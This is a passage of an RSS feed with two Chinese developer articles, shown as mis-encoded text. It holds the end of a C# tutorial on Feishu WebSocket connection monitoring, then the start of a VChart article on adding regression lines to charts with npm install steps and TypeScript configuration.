        <span class="hljs-keyword">var</span> state = _webSocketManager.GetConnectionState();
        
        <span class="hljs-keyword">return</span> Ok(<span class="hljs-keyword">new</span> WebSocketStatusResponse
        {
            IsConnected = _webSocketManager.IsConnected,
            State = state.Status.ToString(),
            Uptime = stats.Uptime,
            ReconnectCount = stats.ReconnectCount,
            LastError = stats.LastError?.Message,
            Timestamp = DateTime.UtcNow
        });
    }
}
</code></pre>
<p><strong>å®æ—¶çŠ¶æ€ç›‘æ§</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> WebSocketçŠ¶æ€ç›‘æ§æœåŠ¡</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">WebSocketMonitoringService</span> : <span class="hljs-title">IHostedService</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> IFeishuWebSocketManager _webSocketManager;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ILogger&lt;WebSocketMonitoringService&gt; _logger;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> Timer _monitoringTimer;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ConcurrentQueue&lt;ConnectionSnapshot&gt; _snapshots = <span class="hljs-keyword">new</span>();
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">WebSocketMonitoringService</span>(<span class="hljs-params">IFeishuWebSocketManager webSocketManager,
        ILogger&lt;WebSocketMonitoringService&gt; logger</span>)</span>
    {
        _webSocketManager = webSocketManager;
        _logger = logger;
        
        <span class="hljs-comment">// æ¯30ç§’æ”¶é›†ä¸€æ¬¡çŠ¶æ€å¿«ç…§</span>
        _monitoringTimer = <span class="hljs-keyword">new</span> Timer(CollectStatusSnapshot, <span class="hljs-literal">null</span>,
            TimeSpan.Zero, TimeSpan.FromSeconds(<span class="hljs-number">30</span>));
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ”¶é›†çŠ¶æ€å¿«ç…§</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">CollectStatusSnapshot</span>(<span class="hljs-params"><span class="hljs-built_in">object</span>? state</span>)</span>
    {
        <span class="hljs-keyword">var</span> stats = _webSocketManager.GetConnectionStats();
        <span class="hljs-keyword">var</span> connectionState = _webSocketManager.GetConnectionState();
        
        <span class="hljs-keyword">var</span> snapshot = <span class="hljs-keyword">new</span> ConnectionSnapshot
        {
            Timestamp = DateTime.UtcNow,
            IsConnected = stats.IsConnected,
            Uptime = stats.Uptime,
            ReconnectCount = stats.ReconnectCount,
            LastError = stats.LastError,
            ConnectionState = connectionState.Status.ToString()
        };
        
        _snapshots.Enqueue(snapshot);
        
        <span class="hljs-comment">// ä¿æŒæœ€è¿‘100ä¸ªå¿«ç…§</span>
        <span class="hljs-keyword">while</span> (_snapshots.Count &gt; <span class="hljs-number">100</span>)
        {
            _snapshots.TryDequeue(<span class="hljs-keyword">out</span> _);
        }
        
        <span class="hljs-comment">// åˆ†æè¿æ¥è´¨é‡</span>
        AnalyzeConnectionQuality();
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> åˆ†æè¿æ¥è´¨é‡</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">AnalyzeConnectionQuality</span>()</span>
    {
        <span class="hljs-keyword">var</span> recentSnapshots = _snapshots.TakeLast(<span class="hljs-number">10</span>).ToList();
        <span class="hljs-keyword">if</span> (recentSnapshots.Count &lt; <span class="hljs-number">5</span>) <span class="hljs-keyword">return</span>;
        
        <span class="hljs-keyword">var</span> connectedCount = recentSnapshots.Count(s =&gt; s.IsConnected);
        <span class="hljs-keyword">var</span> connectivityRate = (<span class="hljs-built_in">double</span>)connectedCount / recentSnapshots.Count;
        
        <span class="hljs-keyword">if</span> (connectivityRate &lt; <span class="hljs-number">0.9</span>)
        {
            _logger.LogWarning(<span class="hljs-string">"è¿æ¥è´¨é‡è¾ƒå·® - è¿æ¥ç‡: {ConnectivityRate:P2}"</span>, connectivityRate);
        }
        
        <span class="hljs-comment">// åˆ†æé‡è¿é¢‘ç‡</span>
        <span class="hljs-keyword">var</span> reconnectEvents = recentSnapshots
            .Where(s =&gt; s.ReconnectCount &gt; <span class="hljs-number">0</span>)
            .ToList();
        
        <span class="hljs-keyword">if</span> (reconnectEvents.Count &gt; <span class="hljs-number">3</span>)
        {
            _logger.LogWarning(<span class="hljs-string">"é‡è¿é¢‘ç‡è¿‡é«˜ - æœ€è¿‘10æ¬¡æ£€æµ‹ä¸­æœ‰{Count}æ¬¡é‡è¿"</span>, 
                reconnectEvents.Count);
        }
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-18">ğŸ¯ æ€»ç»“</h2>
<p>ä½¿ç”¨ Mud.Feishu.Abstractions å’Œ Mud.Feishu.WebSocket ä¸¤ä¸ªæ ¸å¿ƒé¡¹ç›®æ„å»ºä¼ä¸šçº§çš„é£ä¹¦WebSocketé•¿è¿æ¥åº”ç”¨ã€‚é€šè¿‡ç»„ä»¶åŒ–æ¶æ„è®¾è®¡ã€ç­–ç•¥æ¨¡å¼çš„äº‹ä»¶å¤„ç†ã€å®Œå–„çš„é”™è¯¯éš”ç¦»æœºåˆ¶å’Œå…¨é¢çš„ç›‘æ§ä½“ç³»ï¼Œå¼€å‘è€…å¯ä»¥å¿«é€Ÿæ„å»ºç¨³å®šã€å¯é çš„å®æ—¶äº‹ä»¶å¤„ç†ç³»ç»Ÿã€‚</p>
<p>æ€»çš„æ¥è¯´ï¼ŒMud.Feishu.Abstractions å’Œ Mud.Feishu.WebSocket ä¸¤ä¸ªæ ¸å¿ƒé¡¹ç›®çš„ç›®æ ‡æ˜¯æä¾›ä¸€ä¸ªå¯é ã€æ˜“äºé›†æˆã€é«˜åº¦å¯æ‰©å±•çš„é£ä¹¦WebSocketé•¿è¿æ¥åº”ç”¨æ¡†æ¶ã€‚</p>
<p><strong>æ ¸å¿ƒç‰¹æ€§</strong></p>
<ol>
<li><strong>å¼€ç®±å³ç”¨</strong>ï¼šé¢„ç½®çš„è¿æ¥ç®¡ç†ã€è®¤è¯å¤„ç†ã€æ¶ˆæ¯è·¯ç”±ç­‰æ ¸å¿ƒç»„ä»¶</li>
<li><strong>é«˜åº¦å¯æ‰©å±•</strong>ï¼šåŸºäºæ¥å£çš„äº‹ä»¶å¤„ç†å™¨è®¾è®¡ï¼Œæ”¯æŒè‡ªå®šä¹‰ä¸šåŠ¡é€»è¾‘</li>
<li><strong>ä¼ä¸šçº§ç¨³å®š</strong>ï¼šè‡ªåŠ¨é‡è¿ã€é”™è¯¯éš”ç¦»ã€å¿ƒè·³ç›‘æ§ç­‰ç”Ÿäº§çº§ç‰¹æ€§</li>
<li><strong>æ˜“äºé›†æˆ</strong>ï¼šå®Œæ•´çš„ä¾èµ–æ³¨å…¥æ”¯æŒï¼Œä¸.NETç”Ÿæ€ç³»ç»Ÿæ— ç¼é›†æˆ</li>
<li><strong>å…¨é¢ç›‘æ§</strong>ï¼šè¯¦ç»†çš„æ—¥å¿—è®°å½•å’Œæ€§èƒ½æŒ‡æ ‡ï¼Œä¾¿äºè¿ç»´ç®¡ç†</li>
</ol>
<p>è¿™å¥—æ¶æ„ä¸ºä¼ä¸šçº§å®æ—¶åº”ç”¨æä¾›äº†åšå®çš„åŸºç¡€ï¼Œå¤§å¤§é™ä½äº†é£ä¹¦WebSocketé›†æˆçš„å¼€å‘å¤æ‚åº¦ï¼Œè®©å¼€å‘è€…èƒ½å¤Ÿä¸“æ³¨äºä¸šåŠ¡é€»è¾‘çš„å®ç°ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VChart æ‰©å±•æ–°åŠŸèƒ½ï¼šä¸€è¡Œä»£ç è§£é”æ•°æ®å›å½’ä¸è¶‹åŠ¿åˆ†æ]]></title>    <link>https://juejin.cn/post/7580971667036700698</link>    <guid>https://juejin.cn/post/7580971667036700698</guid>    <pubDate>2025-12-08T03:16:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580971667036700698" data-draft-id="7580623265792622630" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VChart æ‰©å±•æ–°åŠŸèƒ½ï¼šä¸€è¡Œä»£ç è§£é”æ•°æ®å›å½’ä¸è¶‹åŠ¿åˆ†æ"/> <meta itemprop="keywords" content="å‰ç«¯,æ•°æ®å¯è§†åŒ–,ECharts"/> <meta itemprop="datePublished" content="2025-12-08T03:16:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç„é­‚"/> <meta itemprop="url" content="https://juejin.cn/user/571401774834093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VChart æ‰©å±•æ–°åŠŸèƒ½ï¼šä¸€è¡Œä»£ç è§£é”æ•°æ®å›å½’ä¸è¶‹åŠ¿åˆ†æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/571401774834093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç„é­‚
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:16:56.000Z" title="Mon Dec 08 2025 03:16:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨æ•°æ®åˆ†æå’Œå¯è§†åŒ–é¢†åŸŸï¼Œæˆ‘ä»¬å¸¸å¸¸ä¸ä»…æ»¡è¶³äºå±•ç¤ºç¦»æ•£çš„æ•°æ®ç‚¹ï¼Œæ›´æ¸´æœ›æ´å¯Ÿå…¶èƒŒåçš„è¶‹åŠ¿ä¸è§„å¾‹ã€‚æ— è®ºæ˜¯è¿½è¸ªäº§å“æ ¸å¿ƒæŒ‡æ ‡çš„å¢é•¿åŠ¿å¤´ï¼Œåˆ†æ A/B å®éªŒä¸­ä¸åŒç­–ç•¥çš„è½¬åŒ–æ•ˆæœï¼Œè¿˜æ˜¯åœ¨ä¸šåŠ¡å¤ç›˜æ—¶å¯»æ‰¾å…³é”®å˜é‡é—´çš„æ½œåœ¨å…³è”ï¼Œä¸€æ¡å¹³æ»‘çš„â€œè¶‹åŠ¿çº¿â€æ€»èƒ½è®©æ•°æ®æ•…äº‹æ›´åŠ æ¸…æ™°å’Œå¯Œæœ‰æ´å¯ŸåŠ›ã€‚</p>
<p>ä¸ºäº†è®©è¶‹åŠ¿åˆ†æå˜å¾—å‰æ‰€æœªæœ‰çš„ç®€å•ï¼ŒVisActor VChart å›¢é˜Ÿåœ¨æ‰©å±•åŒ… <code>vchart-extension</code> ä¸­æ­£å¼æ¨å‡ºäº†**å›å½’çº¿ï¼ˆRegression Lineï¼‰**åŠŸèƒ½ã€‚ç°åœ¨ï¼Œä½ åªéœ€ä¸€è¡Œç®€å•çš„é…ç½®ï¼Œå³å¯ä¸ºä½ çš„å›¾è¡¨å¢æ·»å¼ºå¤§çš„æ•°æ®å›å½’ä¸è¶‹åŠ¿å±•ç¤ºèƒ½åŠ›ã€‚</p>
<p><strong>æ ¸å¿ƒä»·å€¼</strong>ï¼šVChart å›å½’çº¿æ‰©å±•æ—¨åœ¨å¸®åŠ©ç”¨æˆ·å¿«é€Ÿã€å‡†ç¡®åœ°åœ¨ç°æœ‰å›¾è¡¨ï¼ˆå¦‚æ•£ç‚¹å›¾ã€æŠ˜çº¿å›¾ã€æŸ±çŠ¶å›¾ç­‰ï¼‰ä¸Šå åŠ ç»Ÿè®¡å›å½’çº¿ï¼Œè½»æ¾æ­ç¤ºæ•°æ®å˜é‡é—´çš„æ½œåœ¨å…³ç³»å’Œå‘å±•è¶‹åŠ¿ï¼Œä¸ºæ•°æ®é©±åŠ¨çš„å†³ç­–æä¾›ç›´è§‚å‚è€ƒã€‚</p>
<h2 data-id="heading-0">æ ¸å¿ƒèƒ½åŠ›ä¸€è§ˆ</h2>
<p>VChart çš„å›å½’çº¿æ‰©å±•åŠŸèƒ½å¼ºå¤§ä¸”çµæ´»ï¼Œæ—¨åœ¨æ»¡è¶³ä»å¿«é€Ÿæ¢ç´¢åˆ°æ·±åº¦åˆ†æçš„å„ç±»éœ€æ±‚ã€‚</p>
<ul>
<li>
<p><strong>ä¸°å¯Œçš„å›å½’ç±»å‹</strong>ï¼šå†…ç½®å¤šç§å¸¸ç”¨å›å½’ç®—æ³•ï¼Œæ»¡è¶³ä¸åŒåœºæ™¯çš„åˆ†æéœ€æ±‚ã€‚</p>
</li>
<li>
<p><strong>çº¿æ€§å›å½’ (linear)</strong>ï¼šæ¢ç´¢å˜é‡é—´çš„çº¿æ€§å…³ç³»ã€‚</p>
</li>
<li>
<p><strong>å¤šé¡¹å¼å›å½’ (polynomial)</strong>ï¼šæ‹Ÿåˆéçº¿æ€§çš„å¤æ‚è¶‹åŠ¿ï¼Œæ”¯æŒè‡ªå®šä¹‰é˜¶æ•°ã€‚</p>
</li>
<li>
<p><strong>å¯¹æ•°å›å½’ (logarithmic)</strong>ï¼šé€‚ç”¨äºå¢é•¿ç‡å…ˆå¿«åæ…¢çš„åœºæ™¯ã€‚</p>
</li>
<li>
<p><strong>æŒ‡æ•°å›å½’ (exponential)</strong>ï¼šæ¨¡æ‹Ÿæ•°æ®å‘ˆæŒ‡æ•°çº§å¢é•¿çš„è¶‹åŠ¿ã€‚</p>
</li>
<li>
<p><strong>Loess å›å½’ (loess)</strong>ï¼šå±€éƒ¨åŠ æƒå›å½’ï¼Œæ“…é•¿æ•æ‰å±€éƒ¨çš„æ•°æ®å˜åŒ–è¶‹åŠ¿ã€‚</p>
</li>
<li>
<p><strong>æ ¸å¯†åº¦ä¼°è®¡ (KDE)</strong>ï¼šåœ¨ç›´æ–¹å›¾ä¸Šå åŠ å¹³æ»‘çš„æ¦‚ç‡å¯†åº¦æ›²çº¿ã€‚</p>
</li>
<li>
<p><strong>ç»éªŒç´¯ç§¯åˆ†å¸ƒ (ECDF)</strong>ï¼šå±•ç¤ºæ•°æ®çš„ç´¯ç§¯åˆ†å¸ƒæƒ…å†µã€‚</p>
</li>
<li>
<p><strong>æ— ç¼é›†æˆå¤šç§å›¾è¡¨</strong>ï¼šå¯è½»æ¾ä¸ VChart ä¸­æœ€å¸¸ç”¨çš„å›¾è¡¨ç±»å‹ç»“åˆã€‚</p>
</li>
<li>
<p><strong>æ•£ç‚¹å›¾</strong>ï¼šå›å½’åˆ†æçš„ç»å…¸åœºæ™¯ï¼Œç›´è§‚å±•ç¤ºä¸¤ä¸ªè¿ç»­å˜é‡çš„æ‹Ÿåˆè¶‹åŠ¿ã€‚</p>
</li>
<li>
<p><strong>æŸ±çŠ¶å›¾</strong>ï¼šä¸ºç¦»æ•£çš„åˆ†ç±»æ•°æ®æ·»åŠ æ•´ä½“è¶‹åŠ¿å‚è€ƒã€‚</p>
</li>
<li>
<p><strong>ç›´æ–¹å›¾</strong>ï¼šç»“åˆ KDE æˆ– ECDFï¼Œæ·±å…¥ç†è§£æ•°æ®åˆ†å¸ƒç‰¹å¾ã€‚</p>
</li>
<li>
<p><strong>æ”¯æŒåˆ†ç»„/åˆ†ç±»å›å½’</strong>ï¼šå½“æ•°æ®åŒ…å«å¤šä¸ªç±»åˆ«æ—¶ï¼Œå¯ä»¥ä¸ºæ¯ä¸ªåˆ†ç»„ç‹¬ç«‹è®¡ç®—å¹¶ç»˜åˆ¶å›å½’çº¿ï¼Œä¾¿äºè¿›è¡Œç²¾ç»†åŒ–çš„å¯¹æ¯”åˆ†æã€‚</p>
</li>
<li>
<p><strong>é«˜åº¦å¯å®šåˆ¶çš„æ ·å¼</strong>ï¼šå›å½’çº¿ã€å…¬å¼æ ‡ç­¾ã€ç½®ä¿¡åŒºé—´ç­‰å…ƒç´ çš„æ ·å¼å‡æ”¯æŒç²¾ç»†åŒ–é…ç½®ï¼Œç¡®ä¿è§†è§‰æ•ˆæœä¸æ•´ä½“è®¾è®¡é£æ ¼å®Œç¾èåˆã€‚</p>
</li>
</ul>
<h2 data-id="heading-1">å¿«é€Ÿä¸Šæ‰‹ï¼šä¸‰æ­¥ä¸ºæ•£ç‚¹å›¾æ·»åŠ å›å½’çº¿</h2>
<p>ä¸ºå›¾è¡¨æ·»åŠ å›å½’çº¿éå¸¸ç®€å•ã€‚éµå¾ªä»¥ä¸‹ä¸‰æ­¥ï¼Œå³å¯åœ¨ä½ çš„ VChart é¡¹ç›®ä¸­å¯ç”¨è¯¥åŠŸèƒ½ã€‚</p>
<h3 data-id="heading-2">ç¬¬ä¸€æ­¥ï¼šå®‰è£…å¹¶å¼•å…¥æ‰©å±•åŒ…</h3>
<p>é¦–å…ˆï¼Œè¯·ç¡®ä¿ä½ çš„é¡¹ç›®ä¸­å·²å®‰è£… VChart åŠå…¶æ‰©å±•åŒ…ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨ npm</span>
npm install @visactor/vchart @visactor/vchart-extension

<span class="hljs-comment"># ä½¿ç”¨ yarn</span>
yarn add @visactor/vchart @visactor/vchart-extension
    

</code></pre>
<h3 data-id="heading-3">ç¬¬äºŒæ­¥ï¼šæ³¨å†Œå›å½’çº¿ç»„ä»¶</h3>
<p>åœ¨ä½ çš„ä»£ç å…¥å£å¤„ï¼Œå¼•å…¥å¹¶æ³¨å†Œå›å½’çº¿ç»„ä»¶ã€‚è¿™æ˜¯å¯ç”¨æ‰€æœ‰ç›¸å…³åŠŸèƒ½çš„å…³é”®ã€‚</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">VChart</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@visactor/vchart'</span>;
<span class="hljs-keyword">import</span> { registerRegressionLine } <span class="hljs-keyword">from</span> <span class="hljs-string">'@visactor/vchart-extension'</span>;

<span class="hljs-comment">// åªéœ€è°ƒç”¨ä¸€æ¬¡</span>
<span class="hljs-title function_">registerRegressionLine</span>();
    

</code></pre>
<h3 data-id="heading-4">ç¬¬ä¸‰æ­¥ï¼šåœ¨å›¾è¡¨é…ç½®ä¸­æ·»åŠ å›å½’çº¿</h3>
<p>å®Œæˆæ³¨å†Œåï¼Œå³å¯åœ¨å›¾è¡¨ spec ä¸­é€šè¿‡ <code>append*RegressionLineConfig</code> ç³»åˆ—è¾…åŠ©å‡½æ•°æ¥æ·»åŠ å›å½’çº¿ã€‚ä»¥æœ€å¸¸è§çš„æ•£ç‚¹å›¾ä¸ºä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { appendScatterRegressionLineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'@visactor/vchart-extension'</span>;

<span class="hljs-comment">// å‡è®¾ä½ å·²æœ‰ä¸€ä¸ªåŸºç¡€çš„æ•£ç‚¹å›¾ spec</span>
<span class="hljs-keyword">const</span> spec = {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'scatter'</span>,
  <span class="hljs-attr">data</span>: {
    <span class="hljs-attr">values</span>: [
      { <span class="hljs-attr">name</span>: <span class="hljs-string">'chevrolet chevelle malibu'</span>, <span class="hljs-attr">milesPerGallon</span>: <span class="hljs-number">18</span>, <span class="hljs-attr">cylinders</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">horsepower</span>: <span class="hljs-number">130</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'buick skylark 320'</span>, <span class="hljs-attr">milesPerGallon</span>: <span class="hljs-number">15</span>, <span class="hljs-attr">cylinders</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">horsepower</span>: <span class="hljs-number">165</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'plymouth satellite'</span>, <span class="hljs-attr">milesPerGallon</span>: <span class="hljs-number">18</span>, <span class="hljs-attr">cylinders</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">horsepower</span>: <span class="hljs-number">150</span> },
      <span class="hljs-comment">// ... æ›´å¤šæ•°æ®</span>
    ]
  },
  <span class="hljs-attr">xField</span>: <span class="hljs-string">'milesPerGallon'</span>,
  <span class="hljs-attr">yField</span>: <span class="hljs-string">'horsepower'</span>,
};

<span class="hljs-comment">// ä¸º spec æ·»åŠ å›å½’çº¿é…ç½®</span>
<span class="hljs-title function_">appendScatterRegressionLineConfig</span>(spec, {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'linear'</span> <span class="hljs-comment">// æŒ‡å®šå›å½’ç±»å‹ä¸ºçº¿æ€§å›å½’</span>
});

<span class="hljs-comment">// ç°åœ¨ï¼Œspec å°±åŒ…å«äº†å›å½’çº¿é…ç½®ï¼Œå¯ä»¥ç”¨äº VChart æ¸²æŸ“äº†</span>
<span class="hljs-keyword">const</span> vchart = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VChart</span>(spec, { <span class="hljs-attr">dom</span>: <span class="hljs-string">'chart-container'</span> });
vchart.<span class="hljs-title function_">renderSync</span>();
    

</code></pre>
<p>å°±æ˜¯è¿™ä¹ˆç®€å•ï¼æ¸²æŸ“åçš„å›¾è¡¨å°†åœ¨åŸå§‹æ•£ç‚¹å›¾çš„åŸºç¡€ä¸Šï¼Œè‡ªåŠ¨ç»˜åˆ¶å‡ºä¸€æ¡çº¿æ€§å›å½’çº¿ã€‚</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dea78accc1b2448dbe630bf8bdee5b43~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546E6a2C:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765768615&amp;x-signature=NQs0W95sNvwRzCLt43ShApEexgc%3D" alt="" width="988" height="auto" loading="lazy"/>
<h2 data-id="heading-5">è¿›é˜¶é…ç½®ä¸ç¤ºä¾‹</h2>
<p>VChart å›å½’çº¿æ‰©å±•æä¾›äº†ä¸°å¯Œçš„é…ç½®é¡¹ï¼Œè®©ä½ èƒ½å¤Ÿç²¾ç»†æ§åˆ¶å›å½’çº¿çš„è¡Œä¸ºå’Œå¤–è§‚ã€‚</p>
<h3 data-id="heading-6">å…³é”®é…ç½®é¡¹è§£æ</h3>
<p>åœ¨ä½¿ç”¨ <code>append*RegressionLineConfig</code> å‡½æ•°æ—¶ï¼Œç¬¬äºŒä¸ªå‚æ•° <code>config</code> å¯¹è±¡æ”¯æŒä»¥ä¸‹å…³é”®å±æ€§ï¼š</p>
<ul>
<li>
